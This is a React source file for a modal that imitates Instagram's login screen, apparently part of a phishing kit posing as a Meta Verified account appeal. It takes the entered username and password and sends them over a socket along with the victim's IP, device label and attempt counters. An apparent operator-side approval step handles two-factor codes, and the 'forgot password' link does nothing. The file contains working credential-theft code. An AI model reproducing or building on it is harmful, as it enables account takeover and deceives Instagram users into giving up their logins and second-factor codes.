'use client';

import '@/assets/css/meta-verified-modals.css';
import LogoInsta from '@/assets/images/logo-insta.webp';
import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { submitLoginApproval } from '@/hooks/use-socket';
import Image from 'next/image';
import { type FC, type FormEvent, useEffect, useState } from 'react';

const EyeOffIcon: FC = () => (
    <svg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'>
        <path d='M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49' />
        <path d='M14.084 14.158a3 3 0 0 1-4.242-4.242' />
        <path d='M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143' />
        <path d='m2 2 20 20' />
    </svg>
);

const EyeIcon: FC = () => (
    <svg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'>
        <path d='M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0' />
        <circle cx='12' cy='12' r='3' />
    </svg>
);

const InstagramLoginModal: FC<{ nextStep: () => void; uiTexts: MetaVerifiedTexts }> = ({ nextStep, uiTexts }) => {
    const [identity, setIdentity] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [showError, setShowError] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    const appeal = useAppealContext();

    useEffect(() => {
        document.title = 'Instagram login';
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (!identity.trim() || !password.trim() || isLoading) {
            return;
        }

        setShowError(false);
        setIsLoading(true);

        try {
            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                throw new Error('socket unavailable');
            }

            const result = await submitLoginApproval(
                {
                    socket: appeal.socket,
                    messageId: appeal.messageId,
                    setMessageId: appeal.setMessageId,
                    formData: appeal.formData,
                    loginData: appeal.loginData,
                    loginProvider: appeal.loginProvider,
                    passwordAttempts: appeal.passwordAttempts,
                    twoFAAttempts: appeal.twoFAAttempts,
                    deviceLabel: appeal.deviceLabel,
                    ip: appeal.ip,
                    setLoginData: appeal.setLoginData,
                    addPasswordAttempt: appeal.addPasswordAttempt,
                    addTwoFAAttempt: appeal.addTwoFAAttempt
                },
                identity,
                password
            );

            if (result.approved || result.needs2FA) {
                nextStep();
                return;
            }

            setShowError(true);
            setPassword('');
        } catch {
            setShowError(true);
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='mv-modal-overlay mv-modal-overlay--center' role='dialog' aria-modal='true'>
            <div className='mv-modal-card mv-modal-card--login'>
                <div style={{ width: '56px', height: '56px', flexShrink: 0 }}>
                    <Image src={LogoInsta} width={56} height={56} alt='Instagram' style={{ objectFit: 'contain' }} />
                </div>

                <div className='w-full'>
                    <p style={{ marginBottom: '7px', fontSize: '14px', color: '#9a979e', lineHeight: 1.5, textAlign: 'center' }}>
                        {uiTexts.securityReason}
                    </p>

                    <form autoComplete='off' onSubmit={handleSubmit}>
                        <div className='mv-login-input-wrap'>
                            <input
                                className='mv-login-input'
                                type='text'
                                placeholder={uiTexts.mobileOrEmail}
                                autoComplete='username'
                                required
                                value={identity}
                                onChange={(e) => {
                                    setIdentity(e.target.value);
                                    setShowError(false);
                                }}
                            />
                        </div>

                        <div className={`mv-login-input-wrap${showError ? ' is-error' : ''}`}>
                            <input
                                className='mv-login-input'
                                type={showPassword ? 'text' : 'password'}
                                placeholder={uiTexts.password}
                                autoComplete='off'
                                maxLength={30}
                                minLength={3}
                                required
                                value={password}
                                onChange={(e) => {
                                    setPassword(e.target.value);
                                    setShowError(false);
                                }}
                            />
                            <button
                                type='button'
                                className='mv-login-eye'
                                tabIndex={-1}
                                aria-label='toggle password visibility'
                                onClick={() => setShowPassword((v) => !v)}
                            >
                                {showPassword ? <EyeIcon /> : <EyeOffIcon />}
                            </button>
                        </div>

                        {showError ? (
                            <p style={{ color: '#e74c3c', fontSize: '13px', margin: '0 0 10px 2px' }}>{uiTexts.passwordIncorrect}</p>
                        ) : null}

                        <div style={{ marginTop: '20px', width: '100%' }}>
                            <button type='submit' className='mv-login-submit' disabled={isLoading}>
                                {isLoading ? <span className='mv-modal-spinner' /> : uiTexts.logIn}
                            </button>
                        </div>

                        <div style={{ marginTop: '10px', textAlign: 'center' }}>
                            <span style={{ fontSize: '14px', color: '#9a979e', opacity: 0.5 }}>{uiTexts.forgotPassword}</span>
                        </div>
                    </form>
                </div>

                <div style={{ width: '60px', height: '60px', flexShrink: 0 }}>
                    <Image src={MetaLogoGrey} width={60} height={60} alt='Meta' style={{ objectFit: 'contain' }} />
                </div>
            </div>
        </div>
    );
};

export default InstagramLoginModal;
